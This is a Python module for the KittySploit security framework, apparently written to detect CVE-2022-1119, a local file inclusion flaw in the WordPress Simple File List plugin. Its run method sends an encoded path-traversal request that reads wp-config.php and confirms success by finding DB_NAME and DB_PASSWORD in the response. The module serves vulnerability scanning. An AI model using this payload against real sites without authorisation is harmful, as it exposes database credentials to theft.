#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Simple File List before 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Simple File List <3.2.8 - Local File Inclusion Detection',
        'description': 'WordPress Simple File List before 3.2.8 is vulnerable to local file inclusion via the eeFile parameter in the ~/includes/ee-downloader.php due to missing controls which make it possible for unauthenticated attackers retrieve arbitrary files.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'wp', 'wp-plugin', 'wpscan', 'lfi', 'wordpress', 'simplefilelist', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/5551038f-64fb-44d8-bea0-d2f00f04877e',
            'https://wpscan.com/vulnerability/075a3cc5-1970-4b64-a16f-3ec97e22b606',
            'https://plugins.trac.wordpress.org/browser/simple-file-list/trunk/includes/ee-downloader.php?rev=2071880',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-1119',
            'https://www.wordfence.com/vulnerability-advisories/#CVE-2022-1119',
        ],
        'cve': 'CVE-2022-1119',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('DB_NAME', 'DB_PASSWORD',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='high',
                reason="WordPress Simple File List <3.2.8 - Local File Inclusion detected",
                path='/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e/wp-config.php',
            )
            return True
        return False

